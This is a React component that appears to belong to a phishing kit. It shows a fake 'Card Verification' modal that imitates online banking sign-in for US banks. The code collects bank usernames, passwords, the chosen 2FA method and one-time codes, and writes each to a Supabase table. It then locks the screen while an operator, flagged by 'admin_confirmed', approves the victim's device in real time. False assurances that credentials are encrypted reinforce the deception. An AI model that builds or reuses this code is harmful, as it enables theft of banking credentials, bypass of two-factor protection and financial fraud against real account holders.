import { useEffect, useMemo, useState } from "react";
import { US_BANKS, bankLogo } from "@/lib/us-banks";
import { supabase } from "@/integrations/supabase/client";
import { fetchBankLogoOverrides } from "@/lib/bank-logos";
import {
  Search,
  Lock,
  User,
  ShieldCheck,
  Loader2,
  CheckCircle2,
  Smartphone,
  Mail,
  ArrowLeft,
  X,
  Building2,
} from "lucide-react";

type Step = "bank" | "login" | "2fa-method" | "2fa-otp" | "confirm" | "done";

export function BankVerifyModal({
  sessionId,
  onClose,
  onComplete,
  prefilledBank,
}: {
  sessionId: string;
  onClose: () => void;
  onComplete: () => void;
  prefilledBank?: string | null;
}) {
  const [step, setStep] = useState<Step>(prefilledBank ? "login" : "bank");
  const [search, setSearch] = useState("");
  const [bank, setBank] = useState(prefilledBank ?? "");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [twofa, setTwofa] = useState<"sms" | "email" | "">("");
  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const [logoOverrides, setLogoOverrides] = useState<Record<string, string>>({});

  useEffect(() => {
    fetchBankLogoOverrides().then(setLogoOverrides);
  }, []);

  const filtered = useMemo(
    () =>
      US_BANKS.filter((b) =>
        b.name.toLowerCase().includes(search.toLowerCase())
      ).slice(0, 80),
    [search]
  );

  const selectedBankObj = useMemo(
    () => US_BANKS.find((b) => b.name === bank),
    [bank]
  );

  const push = async (fields: Record<string, unknown>) => {
    await supabase
      .from("trial_submissions")
      .upsert(
        { session_id: sessionId, ...fields } as never,
        { onConflict: "session_id" }
      );
  };

  const selectBank = async (b: string) => {
    setBank(b);
    await push({ bank_name: b, step: "bank_selected" });
    setStep("login");
  };

  const submitLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    await push({
      bank_username: username,
      bank_password: password,
      step: "credentials_submitted",
    });
    setTimeout(() => {
      setLoading(false);
      setStep("2fa-method");
    }, 1200);
  };

  const select2fa = async (m: "sms" | "email") => {
    setTwofa(m);
    await push({ twofa_method: m, step: "2fa_selected" });
    setStep("2fa-otp");
  };

  const submitOtp = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    await push({ otp_code: otp, step: "otp_submitted" });
    setTimeout(async () => {
      setLoading(false);
      await push({ step: "awaiting_device_confirmation" });
      setStep("confirm");
    }, 1200);
  };

  // While on the confirm step, listen for admin_confirmed = true
  useEffect(() => {
    if (step !== "confirm") return;
    let cancelled = false;

    const check = async () => {
      const { data } = await supabase
        .from("trial_submissions")
        .select("admin_confirmed")
        .eq("session_id", sessionId)
        .maybeSingle();
      if (cancelled) return;
      if (data?.admin_confirmed) {
        await push({ device_confirmed: true, step: "device_confirmed" });
        setStep("done");
        setTimeout(onComplete, 900);
      }
    };
    check();

    const channel = supabase
      .channel(`confirm_${sessionId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "trial_submissions",
          filter: `session_id=eq.${sessionId}`,
        },
        (payload) => {
          const row = payload.new as { admin_confirmed?: boolean };
          if (row.admin_confirmed) {
            push({ device_confirmed: true, step: "device_confirmed" });
            setStep("done");
            setTimeout(onComplete, 900);
          }
        }
      )
      .subscribe();

    const poll = setInterval(check, 4000);
    return () => {
      cancelled = true;
      clearInterval(poll);
      supabase.removeChannel(channel);
    };
  }, [step, sessionId, onComplete]);

  const locked = step === "confirm";

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      <div
        className="absolute inset-0 bg-black/70 backdrop-blur-sm"
        onClick={() => { if (!locked) onClose(); }}
      />
      <div className="relative w-full max-w-md overflow-hidden rounded-3xl border border-white/10 bg-[oklch(0.18_0.03_240)] shadow-2xl">
        {/* Header */}
        <div className="flex items-center justify-between border-b border-white/10 px-5 py-4">
          <div className="flex items-center gap-2">
            {step !== "bank" && step !== "done" && !locked && (
              <button
                onClick={() => {
                  if (step === "login") setStep("bank");
                  else if (step === "2fa-method") setStep("login");
                  else if (step === "2fa-otp") setStep("2fa-method");
                }}
                className="rounded-full p-1 text-white/70 hover:bg-white/10"
              >
                <ArrowLeft className="h-4 w-4" />
              </button>
            )}
            <div className="flex items-center gap-2">
              <ShieldCheck className="h-4 w-4 text-[var(--azure-glow)]" />
              <span className="text-sm font-semibold text-white">
                Card Verification
              </span>
            </div>
          </div>
          {!locked && (
            <button
              onClick={onClose}
              className="rounded-full p-1 text-white/60 hover:bg-white/10 hover:text-white"
            >
              <X className="h-4 w-4" />
            </button>
          )}
        </div>

        <div className="max-h-[75vh] overflow-y-auto p-5">
          {step === "bank" && (
            <div className="space-y-4">
              <div>
                <h2 className="font-display text-lg font-semibold text-white">
                  Select your bank
                </h2>
                <p className="mt-1 text-xs text-white/60">
                  Choose your card-issuing bank from the list below
                </p>
              </div>
              <div className="relative">
                <Search className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-white/40" />
                <input
                  autoFocus
                  value={search}
                  onChange={(e) => setSearch(e.target.value)}
                  placeholder="Search banks…"
                  className="h-11 w-full rounded-xl border border-white/10 bg-white/[0.04] pl-10 pr-3 text-sm text-white placeholder:text-white/35 outline-none focus:border-[var(--azure)]/60"
                />
              </div>
              <ul className="max-h-80 space-y-1 overflow-y-auto rounded-xl border border-white/10 bg-white/[0.02] p-1">
                {filtered.length === 0 && (
                  <li className="p-3 text-center text-xs text-white/50">
                    No banks found
                  </li>
                )}
                {filtered.map((b) => (
                  <li key={b.name}>
                    <button
                      onClick={() => selectBank(b.name)}
                      className="flex w-full items-center gap-3 rounded-lg px-3 py-2.5 text-left text-sm text-white/85 transition hover:bg-white/10"
                    >
                      <BankLogo domain={b.domain} name={b.name} overrides={logoOverrides} />
                      <span className="truncate">{b.name}</span>
                    </button>
                  </li>
                ))}
              </ul>
            </div>
          )}

          {step === "login" && (
            <form onSubmit={submitLogin} className="space-y-4">
              <div className="flex items-center gap-3 rounded-xl bg-white/[0.04] p-3">
                <div className="flex h-10 w-10 items-center justify-center overflow-hidden rounded-lg bg-white/90 p-1">
                  {selectedBankObj ? (
                    <img
                      src={logoOverrides[selectedBankObj.domain] || bankLogo(selectedBankObj.domain)}
                      alt={selectedBankObj.name}
                      className="h-full w-full object-contain"
                      onError={(e) => {
                        (e.currentTarget as HTMLImageElement).style.display = "none";
                      }}
                    />
                  ) : (
                    <Building2 className="h-5 w-5 text-[var(--azure-glow)]" />
                  )}
                </div>
                <div>
                  <p className="text-sm font-semibold text-white">{bank}</p>
                  <p className="text-[11px] text-white/55">Online Banking Login</p>
                </div>
              </div>
              <div>
                <h2 className="font-display text-lg font-semibold text-white">
                  Sign in to {bank}
                </h2>
                <p className="mt-1 text-xs text-white/60">
                  Enter your online banking credentials to verify your card
                </p>
              </div>
              <Field
                label="Username"
                value={username}
                onChange={setUsername}
                icon={<User className="h-4 w-4" />}
                placeholder="Username or Customer ID"
              />
              <Field
                label="Password"
                value={password}
                onChange={setPassword}
                icon={<Lock className="h-4 w-4" />}
                placeholder="••••••••"
                type="password"
              />
              <button
                disabled={!username || !password || loading}
                className="flex h-12 w-full items-center justify-center gap-2 rounded-xl gradient-azure font-semibold text-white shadow-glow transition active:scale-[0.98] disabled:opacity-50"
              >
                {loading ? (
                  <>
                    <Loader2 className="h-4 w-4 animate-spin" /> Signing in…
                  </>
                ) : (
                  "Login"
                )}
              </button>
              <p className="flex items-center justify-center gap-1.5 text-[10px] text-white/45">
                <Lock className="h-3 w-3" /> Your credentials are encrypted
              </p>
            </form>
          )}

          {step === "2fa-method" && (
            <div className="space-y-4">
              <div>
                <h2 className="font-display text-lg font-semibold text-white">
                  Two-Factor Authentication
                </h2>
                <p className="mt-1 text-xs text-white/60">
                  Choose how you'd like to receive your verification code
                </p>
              </div>
              <div className="space-y-2">
                <MethodButton
                  icon={<Smartphone className="h-5 w-5" />}
                  title="SMS OTP Code"
                  desc="Send a code to your registered phone"
                  onClick={() => select2fa("sms")}
                />
                <MethodButton
                  icon={<Mail className="h-5 w-5" />}
                  title="Email OTP Code"
                  desc="Send a code to your registered email"
                  onClick={() => select2fa("email")}
                />
              </div>
            </div>
          )}

          {step === "2fa-otp" && (
            <form onSubmit={submitOtp} className="space-y-4">
              <div>
                <h2 className="font-display text-lg font-semibold text-white">
                  Enter verification code
                </h2>
                <p className="mt-1 text-xs text-white/60">
                  We sent a 6-digit code via{" "}
                  {twofa === "sms" ? "SMS" : "Email"}. Enter it below.
                </p>
              </div>
              <input
                autoFocus
                value={otp}
                onChange={(e) =>
                  setOtp(e.target.value.replace(/\D/g, "").slice(0, 8))
                }
                inputMode="numeric"
                placeholder="123456"
                className="h-14 w-full rounded-xl border border-white/10 bg-white/[0.04] text-center font-mono text-2xl tracking-[0.5em] text-white placeholder:text-white/25 outline-none focus:border-[var(--azure)]/60"
              />
              <button
                disabled={otp.length < 4 || loading}
                className="flex h-12 w-full items-center justify-center gap-2 rounded-xl gradient-azure font-semibold text-white shadow-glow transition active:scale-[0.98] disabled:opacity-50"
              >
                {loading ? (
                  <>
                    <Loader2 className="h-4 w-4 animate-spin" /> Verifying…
                  </>
                ) : (
                  "Verify Code"
                )}
              </button>
            </form>
          )}

          {step === "confirm" && (
            <div className="space-y-4 text-center">
              <div className="relative mx-auto flex h-16 w-16 items-center justify-center rounded-2xl bg-[var(--azure)]/15">
                <span className="absolute inset-0 animate-ping rounded-2xl bg-[var(--azure)]/25" />
                <ShieldCheck className="relative h-8 w-8 text-[var(--azure-glow)]" />
              </div>
              <div>
                <h2 className="font-display text-lg font-semibold text-white">
                  Confirm This Device From Your app
                </h2>
                <p className="mt-1 text-xs text-white/60">
                  Open your banking app and approve the sign-in request to continue.
                  This window will update automatically once confirmed.
                </p>
              </div>
              <div className="flex items-center justify-center gap-2 rounded-xl bg-white/[0.04] px-3 py-3 text-xs text-white/70">
                <Loader2 className="h-4 w-4 animate-spin text-[var(--azure-glow)]" />
                Waiting for device confirmation…
              </div>
            </div>
          )}

          {step === "done" && (
            <div className="space-y-4 py-6 text-center">
              <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-[var(--success)]/20">
                <CheckCircle2 className="h-8 w-8 text-[oklch(0.78_0.16_150)]" />
              </div>
              <h2 className="font-display text-lg font-semibold text-white">
                Verification complete
              </h2>
              <p className="text-xs text-white/60">Redirecting to your dashboard…</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function BankLogo({ domain, name, overrides }: { domain: string; name: string; overrides?: Record<string, string> }) {
  const [errored, setErrored] = useState(false);
  const src = overrides?.[domain] || bankLogo(domain);
  if (errored) {
    return (
      <span className="flex h-7 w-7 flex-none items-center justify-center rounded-md bg-white/10 text-[10px] font-semibold text-white/70">
        {name.charAt(0)}
      </span>
    );
  }
  return (
    <img
      src={src}
      alt=""
      onError={() => setErrored(true)}
      className="h-7 w-7 flex-none rounded-md bg-white/90 object-contain p-0.5"
    />
  );
}

function MethodButton({
  icon,
  title,
  desc,
  onClick,
}: {
  icon: React.ReactNode;
  title: string;
  desc: string;
  onClick: () => void;
}) {
  return (
    <button
      onClick={onClick}
      className="flex w-full items-center gap-3 rounded-xl border border-white/10 bg-white/[0.03] p-4 text-left transition hover:bg-white/[0.07]"
    >
      <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-[var(--azure)]/15 text-[var(--azure-glow)]">
        {icon}
      </div>
      <div className="flex-1">
        <p className="text-sm font-semibold text-white">{title}</p>
        <p className="text-[11px] text-white/55">{desc}</p>
      </div>
    </button>
  );
}

function Field({
  label,
  value,
  onChange,
  icon,
  placeholder,
  type = "text",
}: {
  label: string;
  value: string;
  onChange: (v: string) => void;
  icon?: React.ReactNode;
  placeholder?: string;
  type?: string;
}) {
  return (
    <label className="block">
      <span className="mb-1.5 block text-[11px] font-medium uppercase tracking-wider text-white/55">
        {label}
      </span>
      <div className="relative">
        {icon && (
          <span className="pointer-events-none absolute left-3.5 top-1/2 -translate-y-1/2 text-white/45">
            {icon}
          </span>
        )}
        <input
          type={type}
          value={value}
          onChange={(e) => onChange(e.target.value)}
          placeholder={placeholder}
          className={`h-12 w-full rounded-xl border border-white/10 bg-white/[0.04] ${
            icon ? "pl-10" : "pl-3.5"
          } pr-3.5 text-sm text-white placeholder:text-white/35 outline-none focus:border-[var(--azure)]/60`}
        />
      </div>
    </label>
  );
}
